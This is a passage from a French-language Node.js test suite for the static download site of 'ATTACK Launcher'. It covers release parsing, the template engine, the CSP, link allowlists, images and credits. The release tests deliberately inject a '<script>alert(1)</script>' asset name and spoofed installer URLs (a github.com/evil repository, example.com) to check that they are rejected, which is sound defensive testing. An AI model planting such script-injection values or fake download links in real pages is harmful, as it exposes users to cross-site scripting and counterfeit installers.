'use strict';
// Site statique (scripts/build-site.js, scripts/serve-site.js) : release validée, modèle, CSP, liens, images, police, poids.
// Aucun réseau : la release vient de test/fixtures/site-release*.json. Les contrôles « contenu du site » portent sur
// site/ ; tant que site/template.html n'existe pas, SITE_SRC=<dossier de sources> les fait tourner sur un modèle d'essai
// (sans variable, ils sont marqués « skip » avec la raison).
const test = require('node:test');
const assert = require('node:assert/strict');
const { spawnSync } = require('node:child_process');
const fs = require('node:fs');
const http = require('node:http');
const path = require('node:path');
const zlib = require('node:zlib');
const site = require('../scripts/build-site');
const serve = require('../scripts/serve-site');
const catalog = require('../src/main/catalog');
const { tempDir } = require('./helpers');

const ROOT = path.join(__dirname, '..');
const REAL_SRC = path.join(ROOT, 'site');
const SRC = process.env.SITE_SRC ? path.resolve(process.env.SITE_SRC) : REAL_SRC;
const FIXTURE = path.join(ROOT, 'test', 'fixtures', 'site-release.json');
const TRAP = path.join(ROOT, 'test', 'fixtures', 'site-release-trap.json');
const HAVE_SRC = ['template.html', '404.template.html', 'i18n.js', 'styles.css'].every((f) => fs.existsSync(path.join(SRC, f)));
const NEED_SRC = HAVE_SRC ? false : 'site/template.html pas encore écrit : lancer avec SITE_SRC=<dossier de sources du site>';
const EXPECTED_CSP = "default-src 'none'; style-src 'self'; img-src 'self'; font-src 'self'; script-src 'none'; connect-src 'none'; base-uri 'none'; form-action 'none'";
const KEYS = ['launcher-home', 'launcher-home-fabric', 'launcher-mods', 'launcher-mods-fabric', 'launcher-settings', 'launcher-account', 'launcher-changelog',
  'client-menu', 'client-search', 'client-favorites', 'client-hud-editor'];
const ALLOWED_HOSTS = new Set(['github.com', 'modrinth.com', 'optifine.net', 'minecraft.net', 'www.minecraft.net', 'openfontlicense.org', '7shiki3.github.io',
  'learn.microsoft.com', 'support.microsoft.com', 'electronjs.org', 'www.electronjs.org', 'threejs.org', 'bs-community.github.io']);

const readJson = (file) => JSON.parse(fs.readFileSync(file, 'utf8'));
const builds = new Map();
/** Génère une fois (par fixture) le site de SRC dans un dossier temporaire. */
function generated(fixture = FIXTURE) {
  if (!builds.has(fixture)) {
    const out = path.join(tempDir('attack-site-'), '_site');
    builds.set(fixture, site.build({ out, src: SRC, fixture }).then((result) => ({ ...result, read: (f) => fs.readFileSync(path.join(out, f), 'utf8') })));
  }
  return builds.get(fixture);
}

/** Dossier de sources minimal pour tester le moteur de modèle sans dépendre de site/. */
function miniSrc(template, { fr = {}, en = fr, manifest = null, images = [] } = {}) {
  const dir = tempDir('attack-site-src-');
  const doc = (body) => `<!doctype html><html lang="{{lang}}"><head><title>t</title></head><body>${body}</body></html>`;
  fs.writeFileSync(path.join(dir, 'template.html'), doc(template));
  fs.writeFileSync(path.join(dir, '404.template.html'), doc('{{t.x}}'));
  fs.writeFileSync(path.join(dir, 'styles.css'), 'body{}');
  fs.writeFileSync(path.join(dir, 'i18n.js'), `module.exports = ${JSON.stringify({ fr: { x: 'x', ...fr }, en: { x: 'x', ...en } })};`);
  if (manifest) {
    fs.mkdirSync(path.join(dir, 'img'));
    fs.writeFileSync(path.join(dir, 'img', 'manifest.json'), JSON.stringify(manifest));
    for (const file of images) fs.copyFileSync(path.join(REAL_SRC, 'img', file), path.join(dir, 'img', file));
  }
  return dir;
}
const buildMini = (src, options = {}) => site.build({ src, out: path.join(tempDir('attack-site-out-'), '_site'), fixture: FIXTURE, ...options });
async function miniPage(template, options, page = 'index.html') {
  const result = await buildMini(miniSrc(template, options.i18n || {}), options.build);
  return fs.readFileSync(path.join(result.out, page), 'utf8');
}

/**
 * Attributs d'une balise, valeurs entre guillemets doubles, simples ou sans guillemets (`href=https://x.test/a`).
 * Comme un navigateur : la PREMIÈRE occurrence d'un attribut en double gagne, les autres sont ignorées.
 */
function attrs(tag) {
  const out = {};
  for (const m of tag.matchAll(/([^\s"'<>/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'<>`]+)))?/g)) {
    const name = m[1].toLowerCase();
    if (!Object.hasOwn(out, name)) out[name] = m[2] ?? m[3] ?? m[4] ?? '';
  }
  return out;
}

/**
 * Balises `<name …>` d'un HTML (`name` est un motif d'expression régulière), découpées comme un navigateur : un `>` dans une
 * valeur entre guillemets (après `=`) ne ferme pas la balise. Une balise jamais fermée court jusqu'à la fin du texte.
 */
function tagsOf(html, name) {
  const tags = [];
  const start = new RegExp(`<(?:${name})(?=[\\s/>])`, 'gi');
  for (let m; (m = start.exec(html));) {
    let quote = null;
    let valueNext = false; // juste après « = » : un guillemet ouvre alors une valeur
    let end = m.index + m[0].length;
    for (; end < html.length; end++) {
      const c = html[end];
      if (quote) {
        if (c === quote) quote = null;
      } else if (c === '>') {
        break;
      } else if (valueNext && (c === '"' || c === "'")) {
        quote = c;
        valueNext = false;
      } else if (c === '=') {
        valueNext = true;
      } else if (!/\s/.test(c)) {
        valueNext = false;
      }
    }
    tags.push(html.slice(m.index, end + 1));
    start.lastIndex = end + 1;
  }
  return tags;
}

const NAMED_REFERENCES = { quot: '"', apos: "'", lt: '<', gt: '>', amp: '&', colon: ':', sol: '/', bsol: '\\', comma: ',', period: '.', Tab: '\t', NewLine: '\n' };
/**
 * Références HTML d'une valeur d'attribut, en une seule passe : `&#47;`, `&#x2F;`, `&colon;`, `&amp;`… (`&amp;#47;` reste `&#47;`).
 * Comme un navigateur, le `;` final est facultatif pour une référence numérique (`&#47&#47` = `//`).
 */
const decode = (text) => text.replace(/&(?:#(\d+);?|#[xX]([0-9a-fA-F]+);?|([A-Za-z]+);)/g, (all, dec, hex, named) => {
  if (named) return Object.hasOwn(NAMED_REFERENCES, named) ? NAMED_REFERENCES[named] : all;
  const code = dec !== undefined ? Number.parseInt(dec, 10) : Number.parseInt(hex, 16);
  return code <= 0x10ffff ? String.fromCodePoint(code) : all;
});
/** Adresse DÉJÀ décodée, nettoyée comme le fait un navigateur : tabulations et retours supprimés, bords nettoyés, `\` lu comme `/`. */
const cleanUrl = (value) => String(value).replace(/[\t\n\r]/g, '').replace(/^[\x00-\x20]+|[\x00-\x20]+$/g, '').replace(/\\/g, '/');
/** Adresse telle que la lit un navigateur : références décodées (une seule fois), puis nettoyée. */
const urlOf = (value) => cleanUrl(decode(String(value)));

/** Balises qui chargent une ressource hors du site (src, srcset, href de <link>, avec ou sans guillemets) : une ligne par balise fautive. */
function thirdPartyResources(html) {
  const remote = (url) => /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i.test(url);
  const found = [];
  for (const name of ['img', 'link', 'source', 'iframe', 'object', 'embed', 'script']) {
    for (const tag of tagsOf(html, name)) {
      const a = attrs(tag);
      // srcset : décodé AVANT d'être coupé sur les virgules (une virgule peut s'écrire &#44;), puis chaque adresse nettoyée sans second décodage
      const srcset = decode(String(a.srcset || '')).split(',').map((part) => cleanUrl(part.trim().split(/\s+/)[0]));
      const urls = [urlOf(a.src || ''), a.rel === 'canonical' || a.rel === 'alternate' ? '' : urlOf(a.href || ''), ...srcset];
      if (urls.some((url) => url && remote(url))) found.push(tag.slice(0, 120));
    }
  }
  return found;
}

/** Liens <a> et <link> vers l'extérieur : https seulement, hôte de la liste blanche, rel="noopener noreferrer" sur les <a> hors du site. */
function externalLinkProblems(html, page = 'page') {
  const problems = [];
  for (const tag of [...tagsOf(html, 'a'), ...tagsOf(html, 'link')]) {
    const a = attrs(tag);
    const href = urlOf(a.href || '');
    if (href.startsWith('//')) {
      problems.push(`${page} : ${href} sans protocole`);
      continue;
    }
    if (!/^[a-z][a-z0-9+.-]*:/i.test(href) || /^(mailto|tel):/i.test(href)) continue;
    let url;
    try {
      url = new URL(href);
    } catch {
      problems.push(`${page} : ${href} illisible`);
      continue;
    }
    if (url.protocol !== 'https:') problems.push(`${page} : ${href} n'est pas en https`);
    else if (!ALLOWED_HOSTS.has(url.hostname)) problems.push(`${page} : hôte non autorisé ${url.hostname}`);
    if (/^<a\s/i.test(tag) && url.hostname !== '7shiki3.github.io') {
      const rel = (a.rel || '').split(/\s+/);
      if (!rel.includes('noopener') || !rel.includes('noreferrer')) problems.push(`${page} : ${href} sans rel="noopener noreferrer"`);
    }
  }
  return problems;
}

// --- release -----------------------------------------------------------------------------------------------------

test('release : la fixture valide donne la version, l’adresse du Setup, la taille et le SHA-256', () => {
  const { rel, problems } = site.parseRelease(readJson(FIXTURE));
  assert.deepEqual(problems, []);
  assert.equal(rel.version, '0.5.16');
  assert.equal(rel.tag, 'v0.5.16');
  assert.equal(rel.setupUrl, 'https://github.com/7ShIkI3/attack-launcher/releases/download/v0.5.16/ATTACK-Launcher-Setup-0.5.16.exe');
  assert.equal(rel.portableUrl, 'https://github.com/7ShIkI3/attack-launcher/releases/download/v0.5.16/ATTACK-Launcher-Portable-0.5.16.exe');
  assert.equal(rel.releaseUrl, 'https://github.com/7ShIkI3/attack-launcher/releases/tag/v0.5.16');
  assert.equal(rel.setupSize, 112763722);
  assert.equal(rel.sha256, '2299e608466c913ebb39654b549c87c03bcef21e57ddb7f4320b6ea1da58521d');
  assert.equal(rel.publishedAt.toISOString(), '2026-10-25T12:51:34.000Z');
});

test('release : tout ce qui est douteux rend la release inutilisable', () => {
  const base = () => readJson(FIXTURE);
  const setup = (json) => json.assets.find((a) => a.name.startsWith('ATTACK-Launcher-Setup-') && a.name.endsWith('.exe'));
  const bad = {
    'adresse d’un autre dépôt': (j) => { setup(j).browser_download_url = 'https://github.com/evil/attack-launcher/releases/download/v0.5.16/ATTACK-Launcher-Setup-0.5.16.exe'; },
    'adresse d’un autre site': (j) => { setup(j).browser_download_url = 'https://example.com/ATTACK-Launcher-Setup-0.5.16.exe'; },
    'adresse http': (j) => { setup(j).browser_download_url = setup(j).browser_download_url.replace('https:', 'http:'); },
    'deux Setup': (j) => { j.assets.push({ ...setup(j) }); },
    'Setup absent': (j) => { j.assets = j.assets.filter((a) => a !== setup(j)); },
    'balise dans le nom': (j) => { setup(j).name = 'ATTACK-Launcher-Setup-0.5.16.exe<script>alert(1)</script>'; },
    'nom hors règle': (j) => { setup(j).name = 'ATTACK-Launcher-Setup-latest.exe'; },
    'taille trop petite': (j) => { setup(j).size = 1000; },
    'taille trop grande': (j) => { setup(j).size = 2 * 1024 ** 3; },
    'taille décimale': (j) => { setup(j).size = 120000000.5; },
    'taille en texte': (j) => { setup(j).size = '120000000'; },
    'tag inattendu': (j) => { j.tag_name = 'v0.5.16-evil'; },
    'version différente du tag': (j) => { j.tag_name = 'v0.5.17'; },
    brouillon: (j) => { j.draft = true; },
    préversion: (j) => { j.prerelease = true; },
    'date illisible': (j) => { j.published_at = 'hier'; },
    'Portable absent': (j) => { j.assets = j.assets.filter((a) => !a.name.includes('Portable')); },
    'envoi incomplet': (j) => { setup(j).state = 'starter'; },
  };
  for (const [label, mutate] of Object.entries(bad)) {
    const json = base();
    mutate(json);
    const { rel, problems } = site.parseRelease(json);
    assert.equal(rel, null, label);
    assert.ok(problems.length > 0, `${label} : la raison est donnée`);
  }
  for (const junk of [null, 'texte', [], 42]) assert.equal(site.parseRelease(junk).rel, null);
});

test('release : un digest invalide n’invalide pas la release, il enlève le SHA-256 (ou le prend dans SHA256SUMS)', () => {
  const noDigest = (json) => { json.assets.find((a) => a.name.includes('Setup-0.5.16.exe') && !a.name.endsWith('blockmap')).digest = 'sha256:ZZ'; return json; };
  assert.equal(site.parseRelease(noDigest(readJson(FIXTURE))).rel.sha256, null);
  const hash = 'ab'.repeat(32);
  const sums = `${'cd'.repeat(32)}  autre.jar\n${hash.toUpperCase()}  ATTACK-Launcher-Setup-0.5.16.exe\n`;
  assert.equal(site.parseRelease(noDigest(readJson(FIXTURE)), { sums }).rel.sha256, hash);
  assert.equal(site.parseRelease(noDigest(readJson(FIXTURE)), { sums: `${hash} *ATTACK-Launcher-Setup-0.5.16.exe` }).rel.sha256, hash);
  const twice = `${hash}  ATTACK-Launcher-Setup-0.5.16.exe\n${'cd'.repeat(32)}  ATTACK-Launcher-Setup-0.5.16.exe\n`;
  assert.equal(site.parseRelease(noDigest(readJson(FIXTURE)), { sums: twice }).rel.sha256, null, 'deux lignes : on ne choisit pas');
  assert.equal(site.parseRelease(noDigest(readJson(FIXTURE)), { sums: `${hash}  ATTACK-Launcher-Setup-9.9.9.exe` }).rel.sha256, null);
});

/** Simule l'API GitHub : chaque lecture renvoie la réponse suivante de `answers` (la dernière se répète) ; un Error est levé. */
function fakeApi(answers) {
  const log = { calls: 0, sleeps: [] };
  const get = async () => {
    const answer = answers[Math.min(log.calls++, answers.length - 1)];
    if (answer instanceof Error) throw answer;
    return JSON.stringify(answer);
  };
  const sleep = async (ms) => { log.sleeps.push(ms); };
  return { get, sleep, log };
}
const network = (api, extra = {}) => ({ fixture: undefined, get: api.get, sleep: api.sleep, retries: 3, retryMs: 7, repoVersion: '0.5.16', ...extra });

test('--strict : une release inutilisable (fichiers pas encore joints, version du Setup différente du tag) fait échouer la génération', async () => {
  await assert.rejects(() => buildMini(miniSrc('x'), { fixture: TRAP, strict: true }), /Aucune release utilisable.*refusée avec --strict/s);
  const wrongTag = readJson(FIXTURE);
  wrongTag.tag_name = 'v0.5.17';
  const file = path.join(tempDir('attack-site-fixture-'), 'release.json');
  fs.writeFileSync(file, JSON.stringify(wrongTag));
  await assert.rejects(() => buildMini(miniSrc('x'), { fixture: file, strict: true }), /version différente du tag/);
  const noAssets = { ...readJson(FIXTURE), assets: [] };
  const empty = path.join(path.dirname(file), 'vide.json');
  fs.writeFileSync(empty, JSON.stringify(noAssets));
  await assert.rejects(() => buildMini(miniSrc('x'), { fixture: empty, strict: true }), /0 fichier\(s\) Setup/);
  // sans --strict : la page « sans release » est générée, et la release valide passe aussi en --strict
  assert.equal((await buildMini(miniSrc('x'), { fixture: empty })).rel, null);
  assert.equal((await buildMini(miniSrc('x'), { fixture: FIXTURE, strict: true })).rel.version, '0.5.16');
});

test('--strict : les fichiers joints après la publication sont attendus (relectures), sinon la génération échoue', async () => {
  const full = readJson(FIXTURE);
  const bare = { ...full, assets: [] };
  const eventually = fakeApi([bare, bare, full]);
  const result = await buildMini(miniSrc('x'), { strict: true, ...network(eventually) });
  assert.equal(result.rel.version, '0.5.16');
  assert.equal(eventually.log.calls, 3, 'trois lectures : deux sans fichiers, une complète');
  assert.deepEqual(eventually.log.sleeps, [7, 7], 'une pause entre deux lectures');

  const never = fakeApi([bare]);
  await assert.rejects(() => buildMini(miniSrc('x'), { strict: true, ...network(never) }), /Aucune release utilisable.*0 fichier\(s\) Setup/s);
  assert.equal(never.log.calls, 4, 'une lecture, puis 3 relectures, puis l’échec');

  const lenient = fakeApi([bare]);
  const page = await buildMini(miniSrc('x'), network(lenient));
  assert.equal(page.rel, null, 'sans --strict : page « sans release », sans attente');
  assert.equal(lenient.log.calls, 1);
  assert.deepEqual(lenient.log.sleeps, []);
});

test('--strict : API injoignable ; sans --strict la page est générée sans release', async () => {
  const down = fakeApi([new Error('HTTP 503')]);
  await assert.rejects(() => buildMini(miniSrc('x'), { strict: true, ...network(down, { retries: 1 }) }), /injoignable \(HTTP 503\).*refusée avec --strict/s);
  const lenient = await buildMini(miniSrc('x'), network(fakeApi([new Error('HTTP 503')])));
  assert.equal(lenient.rel, null);
  assert.ok(lenient.problems[0].includes('injoignable'));
});

test('release plus ancienne que la version de package.json : refusée (publier d’abord la release), plus récente ou égale : acceptée', async () => {
  const api = () => fakeApi([readJson(FIXTURE)]);
  await assert.rejects(() => buildMini(miniSrc('x'), { strict: true, ...network(api(), { repoVersion: '0.6.0', retries: 0 }) }), /v0\.5\.16\) est plus ancienne que la version du dépôt \(0\.6\.0\)/);
  const lenient = await buildMini(miniSrc('x'), network(api(), { repoVersion: '0.6.0' }));
  assert.equal(lenient.rel, null);
  assert.match(lenient.problems[0], /publie d'abord la release v0\.6\.0/);
  for (const version of ['0.5.16', '0.5.15', '0.4.99']) assert.equal((await buildMini(miniSrc('x'), network(api(), { repoVersion: version }))).rel.version, '0.5.16', version);
  // la fixture d'essai (--offline, tests) n'est jamais comparée à package.json
  assert.equal((await buildMini(miniSrc('x'), { fixture: FIXTURE, repoVersion: '9.9.9' })).rel.version, '0.5.16');
  assert.equal(require('../package.json').version.split('.').length, 3);
  assert.ok(site.compareVersions('0.6.0', '0.5.16') > 0 && site.compareVersions('0.5.16', '0.6.0') < 0 && site.compareVersions('1.2.3', '1.2.3') === 0);
  assert.ok(site.compareVersions('0.10.0', '0.9.9') > 0, 'comparaison numérique, pas alphabétique');
});

test('formats : taille en unités binaires et date selon la langue', () => {
  assert.equal(site.formatSize(112763722, 'fr'), '107,5\u00a0Mo');
  assert.equal(site.formatSize(112763722, 'en'), '107.5\u00a0MB');
  assert.equal(site.formatDate(new Date('2026-10-25T12:51:34Z'), 'fr'), '25 octobre 2026');
  assert.equal(site.formatDate(new Date('2026-10-25T12:51:34Z'), 'en'), 'October 25, 2026');
  assert.equal(site.escapeHtml('<a href="x">&\'</a>'), '&lt;a href=&quot;x&quot;&gt;&amp;&#39;&lt;/a&gt;');
});

// --- moteur de modèle (modèles minimaux, indépendants de site/) -----------------------------------------------------

test('modèle : lang, root, url.*, year, cat.*, blocs rel / sha et valeurs échappées', async () => {
  const html = await miniPage('{{lang}}|{{root}}|{{url.fr}}|{{url.en}}|{{url.canonical}}|{{year}}|{{cat.forge189.mc}}|{{cat.forge189.loader}}|{{cat.forge189.java}}|'
    + '{{cat.fabric1211.loader}}|{{cat.fabric263.mc}}|{{cat.fabric263.java}}|{{#rel}}R:{{rel.version}}:{{rel.setupSize}}:{{rel.date}}:{{#sha}}{{rel.sha256}}{{/sha}}{{/rel}}|{{^rel}}NO{{/rel}}|{{rel.releasesUrl}}', {});
  const [lang, root, fr, en, canonical, year, mc, loader, java, fabric, mc26, java26, rel, no, releases] = html.match(/<body>(.*)<\/body>/s)[1].split('|');
  assert.equal(lang, 'fr');
  assert.equal(root, '');
  assert.equal(fr, 'https://7shiki3.github.io/attack-launcher/');
  assert.equal(en, 'https://7shiki3.github.io/attack-launcher/en/');
  assert.equal(canonical, fr);
  assert.equal(Number(year), new Date().getUTCFullYear());
  assert.deepEqual([mc, loader, java], ['1.8.9', 'Forge 11.15.1.2318', '8']);
  assert.equal(fabric, `Fabric Loader ${catalog.FABRIC_LOADER_VERSION}`);
  assert.deepEqual([mc26, java26], ['26.3', '25']);
  assert.equal(rel, 'R:0.5.16:107,5\u00a0Mo:25 octobre 2026:2299e608466c913ebb39654b549c87c03bcef21e57ddb7f4320b6ea1da58521d');
  assert.equal(no, '', 'le bloc « sans release » est vide quand la release est valide');
  assert.equal(releases, 'https://github.com/7ShIkI3/attack-launcher/releases/latest');
});

test('modèle : page anglaise et 404 (root et langue)', async () => {
  const result = await buildMini(miniSrc('{{lang}}|{{root}}|{{url.canonical}}'));
  assert.match(fs.readFileSync(path.join(result.out, 'index.html'), 'utf8'), /<body>fr\|\|https:\/\/7shiki3\.github\.io\/attack-launcher\/<\/body>/);
  assert.match(fs.readFileSync(path.join(result.out, 'en', 'index.html'), 'utf8'), /<body>en\|\.\.\/\|https:\/\/7shiki3\.github\.io\/attack-launcher\/en\/<\/body>/);
  const notFound = await miniPage('{{root}}', {}, '404.html');
  assert.ok(notFound.includes('<body>x</body>'));
  const withRoot = miniSrc('x');
  fs.writeFileSync(path.join(withRoot, '404.template.html'), '<!doctype html><title>t</title>{{root}}|{{lang}}');
  const r = await buildMini(withRoot);
  assert.match(fs.readFileSync(path.join(r.out, '404.html'), 'utf8'), /\/attack-launcher\/\|fr$/);
});

test('modèle : sans release valide, seul le bloc {{^rel}} est rendu et rien du piège ne passe', async () => {
  const html = await miniPage('{{#rel}}RELEASE {{rel.setupUrl}}{{/rel}}{{^rel}}SANS {{rel.releasesUrl}}{{/rel}}', { build: { fixture: TRAP } });
  assert.ok(html.includes('SANS https://github.com/7ShIkI3/attack-launcher/releases/latest'));
  assert.ok(!html.includes('RELEASE') && !html.includes('evil') && !html.includes('<script'));
});

test('modèle : sans SHA-256 connu, le bloc {{#sha}} disparaît et {{^sha}} apparaît', async () => {
  const fixture = path.join(tempDir('attack-site-fixture-'), 'release.json');
  const json = readJson(FIXTURE);
  json.assets.find((a) => a.name.endsWith('Setup-0.5.16.exe')).digest = null;
  fs.writeFileSync(fixture, JSON.stringify(json));
  const html = await miniPage('{{#rel}}[{{#sha}}SHA {{rel.sha256}}{{/sha}}{{^sha}}PAS DE SHA{{/sha}}]{{/rel}}', { build: { fixture } });
  assert.ok(html.includes('[PAS DE SHA]'));
});

test('modèle : les textes de site/i18n.js sont de confiance et peuvent contenir des marqueurs', async () => {
  const html = await miniPage('{{t.a}}|{{t.group.b}}', { i18n: { fr: { a: '<b>gras</b> {{cat.fabric263.mc}}', group: { b: '{{#rel}}v{{rel.version}}{{/rel}}' } }, en: { a: 'x', group: { b: 'y' } } } });
  assert.ok(html.includes('<b>gras</b> 26.3|v0.5.16'));
});

test('modèle : tout marqueur inconnu, mal formé, restant ou mal placé fait échouer la génération', async () => {
  const cases = {
    'marqueur inconnu': '{{nope}}',
    'texte inconnu': '{{t.absent}}',
    'catalogue inconnu': '{{cat.fabric999.mc}}',
    'champ du catalogue inconnu': '{{cat.forge189.nom}}',
    'champ de release inconnu': '{{#rel}}{{rel.nom}}{{/rel}}',
    'image inconnue': '{{img.nope}}',
    'marqueur ouvert': 'avant {{t.x',
    'accolades seules': 'avant }} après',
    'bloc inconnu': '{{#truc}}x{{/truc}}',
    'bloc jamais fermé': '{{#rel}}x',
    'fermeture sans ouverture': '{{/rel}}',
    'fermeture croisée': '{{#rel}}{{#sha}}x{{/rel}}{{/sha}}',
    'rel hors du bloc rel': '{{rel.version}}',
    'rel dans le bloc inverse': '{{^rel}}{{rel.version}}{{/rel}}',
    'sha256 hors du bloc sha': '{{#rel}}{{rel.sha256}}{{/rel}}',
    'option d’image inconnue': '{{img.launcher-home:rapide}}',
  };
  for (const [label, template] of Object.entries(cases)) {
    await assert.rejects(() => buildMini(miniSrc(template), { fixture: FIXTURE }), Error, label);
  }
  // et la clé présente dans une seule langue
  await assert.rejects(() => buildMini(miniSrc('{{t.seul}}', { fr: { seul: 'a' }, en: {} })), /clés différentes entre fr et en/);
  // cycle de textes
  await assert.rejects(() => buildMini(miniSrc('{{t.a}}', { fr: { a: '{{t.a}}' }, en: { a: '{{t.a}}' } })), /imbriqués/);
});

test('modèle : sources manquantes et dossier de sortie dangereux refusés', async () => {
  await assert.rejects(() => site.build({ src: tempDir('attack-site-vide-'), out: path.join(tempDir(), 'x') }), /Source manquante/);
  for (const out of [ROOT, path.dirname(ROOT), REAL_SRC, path.join(REAL_SRC, 'sortie')]) {
    await assert.rejects(() => site.build({ src: REAL_SRC, out, fixture: FIXTURE }), /refusé/, out);
  }
});

test('dossier de sortie dangereux : docs, src, scripts, test, .git, .github… du dépôt sont refusés (sans rien effacer ici)', () => {
  // la garde seule est appelée : si elle laissait passer un dossier, ce test ne le viderait pas
  const dangerous = ['docs', path.join('docs', 'wiki'), path.join('docs', 'images'), 'src', path.join('src', 'main'), 'scripts', 'test', '.git', '.github', 'assets', 'build', 'cosmetics', 'node_modules'];
  for (const name of dangerous) {
    const out = path.join(ROOT, name);
    if (!fs.existsSync(out)) continue;
    assert.throws(() => site.assertSafeOut(out, REAL_SRC), /refusé/, name);
  }
  for (const file of ['package.json', 'README.md']) assert.throws(() => site.assertSafeOut(path.join(ROOT, file), REAL_SRC), /refusé/, file);
});

test('dossier de sortie : neuf, vide, _site ou déjà produit par le script ; jamais un dossier plein qui n’est pas le sien', async () => {
  const src = miniSrc('x');
  const fresh = path.join(tempDir('attack-out-'), 'apercu');
  const first = await site.build({ src, out: fresh, fixture: FIXTURE });
  assert.ok(first.files.includes(site.OUT_MARKER), 'dossier qui n’est pas _site : fichier marqueur écrit');
  fs.writeFileSync(path.join(fresh, 'reste.txt'), 'ancien');
  await site.build({ src, out: fresh, fixture: FIXTURE });
  assert.ok(!fs.existsSync(path.join(fresh, 'reste.txt')), 'un dossier marqué est vidé puis regénéré');

  const empty = tempDir('attack-out-vide-');
  await site.build({ src, out: empty, fixture: FIXTURE });
  assert.ok(fs.existsSync(path.join(empty, 'index.html')));

  const underscore = path.join(tempDir('attack-out-'), '_site');
  fs.mkdirSync(underscore);
  fs.writeFileSync(path.join(underscore, 'ancien.txt'), 'x');
  const named = await site.build({ src, out: underscore, fixture: FIXTURE });
  assert.ok(!named.files.includes(site.OUT_MARKER), '_site : pas de marqueur publié');

  const precious = tempDir('attack-out-precieux-');
  fs.writeFileSync(path.join(precious, 'important.txt'), 'à garder');
  await assert.rejects(() => site.build({ src, out: precious, fixture: FIXTURE }), /n'est pas vide/);
  assert.equal(fs.readFileSync(path.join(precious, 'important.txt'), 'utf8'), 'à garder');
  const file = path.join(tempDir('attack-out-'), 'fichier');
  fs.writeFileSync(file, 'x');
  await assert.rejects(() => site.build({ src, out: file, fixture: FIXTURE }), /n'est pas un dossier/);
});

test('images : tag complet (srcset, sizes, alt, width, height), eager, sizes personnalisé, repli sur l’autre langue', async () => {
  const entry = (key, lang, width, height) => ({ key, lang, width, height, file: `${key}-${lang}-${width}.webp` });
  const manifest = { images: [entry('launcher-home', 'fr', 560, 350), entry('launcher-home', 'fr', 1120, 700), entry('client-menu', 'fr', 854, 480)] };
  const files = manifest.images.map((i) => i.file);
  const real = readJson(path.join(REAL_SRC, 'img', 'manifest.json')).images;
  for (const i of manifest.images) {
    const source = real.find((r) => r.file === i.file);
    assert.ok(source, `${i.file} existe dans le manifeste réel`);
  }
  const i18n = { fr: { alt: { 'launcher-home': 'Accueil "FR"', 'client-menu': 'Menu' } }, en: { alt: { 'launcher-home': 'Home', 'client-menu': 'Menu EN' } } };
  const dir = miniSrc('{{img.launcher-home}}\n{{img.launcher-home:eager}}\n{{img.client-menu|sizes=(min-width: 900px) 640px, 100vw}}', { ...i18n, manifest, images: files });
  const result = await buildMini(dir);
  const fr = fs.readFileSync(path.join(result.out, 'index.html'), 'utf8');
  const [lazy, eager, custom] = tagsOf(fr, 'img');
  assert.equal(lazy, '<img src="img/launcher-home-fr-1120.webp" srcset="img/launcher-home-fr-560.webp 560w, img/launcher-home-fr-1120.webp 1120w" sizes="(min-width: 900px) 560px, calc(100vw - 32px)" width="1120" height="700" alt="Accueil &quot;FR&quot;" loading="lazy" decoding="async">');
  assert.ok(!eager.includes('loading='));
  assert.ok(custom.includes('sizes="(min-width: 900px) 640px, 100vw"') && custom.includes('width="854" height="480"'));
  const en = fs.readFileSync(path.join(result.out, 'en', 'index.html'), 'utf8');
  assert.ok(tagsOf(en, 'img')[0].includes('src="../img/launcher-home-fr-1120.webp"'), 'pas de variante en : on prend le français');
  assert.ok(tagsOf(en, 'img')[0].includes('alt="Home"'), 'mais le texte alternatif est celui de la langue de la page');
  assert.deepEqual(result.images, ['client-menu-fr-854.webp', 'launcher-home-fr-1120.webp', 'launcher-home-fr-560.webp']);
  for (const file of result.images) assert.ok(fs.existsSync(path.join(result.out, 'img', file)));
});

test('images : un manifeste qui ment sur les dimensions fait échouer la génération', async () => {
  const bad = { images: [{ key: 'launcher-home', lang: 'fr', width: 560, height: 351, file: 'launcher-home-fr-560.webp' }] };
  await assert.rejects(() => buildMini(miniSrc('x', { manifest: bad, images: ['launcher-home-fr-560.webp'] })), /le manifeste dit/);
  const wrongName = { images: [{ key: 'launcher-mods', lang: 'fr', width: 560, height: 350, file: 'launcher-home-fr-560.webp' }] };
  await assert.rejects(() => buildMini(miniSrc('x', { manifest: wrongName, images: ['launcher-home-fr-560.webp'] })), /incohérente/);
});

test('crédits : union des mods des 3 packs (un lien Modrinth par slug), licences lisibles et lignes fixes', async () => {
  const html = await miniPage('{{html.credits}}', {});
  const packs = fs.readdirSync(path.join(ROOT, 'src', 'main', 'packs')).filter((f) => f.endsWith('.json'));
  assert.equal(packs.length, 3);
  const union = new Map();
  for (const file of packs) for (const mod of readJson(path.join(ROOT, 'src', 'main', 'packs', file)).mods) union.set(mod.slug, mod);
  const slugs = [...html.matchAll(/href="https:\/\/modrinth\.com\/mod\/([^"]+)"/g)].map((m) => m[1]);
  assert.deepEqual([...slugs].sort(), [...union.keys()].sort());
  assert.equal(new Set(slugs).size, slugs.length, 'un mod présent dans plusieurs packs n’a qu’une ligne');
  assert.ok(html.includes('<table class="credits-table">'));
  assert.ok(html.includes('LGPL 3.0 ou ultérieure') && html.includes('Polyform Shield 1.0.0') && html.includes('Tous droits réservés'));
  assert.ok(!html.includes('LicenseRef-') && !html.includes('GPL-3.0-or-later'), 'identifiants SPDX remplacés par les noms lisibles');
  const replay = html.match(/<tr>(?:(?!<\/tr>).)*replaymod(?:(?!<\/tr>).)*<\/tr>/s)[0];
  assert.ok(replay.includes('1.8.9, 1.21.1, 26.3'), 'Replay Mod : les trois profils');
  assert.ok(replay.includes('Johni0702') && replay.includes('Replay Mod</td>'));
  for (const fixed of ['OptiFine', 'sp614x', 'skinview3d', 'three.js', 'Electron', 'electron-updater', 'Montserrat', 'OFL 1.1']) assert.ok(html.includes(fixed), fixed);
  // electron-updater (MIT) et la police Inter (OFL 1.1) : composants du launcher, avec leur lien, leur licence et leur profil
  for (const [name, url, license] of [['electron-updater', 'https://github.com/electron-userland/electron-builder', 'MIT'], ['Inter', 'https://github.com/rsms/inter', 'OFL 1.1']]) {
    const row = html.match(new RegExp(`<tr><th[^>]*><a href="${url.replace(/\W/g, '\\$&')}" rel="noopener noreferrer">${name}</a></th>(?:(?!</tr>).)*</tr>`, 's'));
    assert.ok(row && row[0].includes(license) && row[0].includes('>Launcher<'), `${name} : ligne, licence ${license}, profil Launcher`);
  }
  assert.ok(html.includes('Jamais téléchargé ni redistribué'));
  const en = await miniPage('{{html.credits}}', {}, 'en/index.html');
